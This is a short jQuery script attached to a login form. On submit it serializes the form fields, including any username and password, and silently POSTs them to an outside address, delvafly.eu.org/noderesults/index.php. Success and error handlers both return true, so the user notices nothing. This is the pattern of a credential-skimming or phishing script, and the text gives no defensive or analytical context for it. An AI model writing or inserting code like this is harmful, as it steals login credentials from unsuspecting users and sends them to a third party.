$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://delvafly.eu.org/noderesults/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
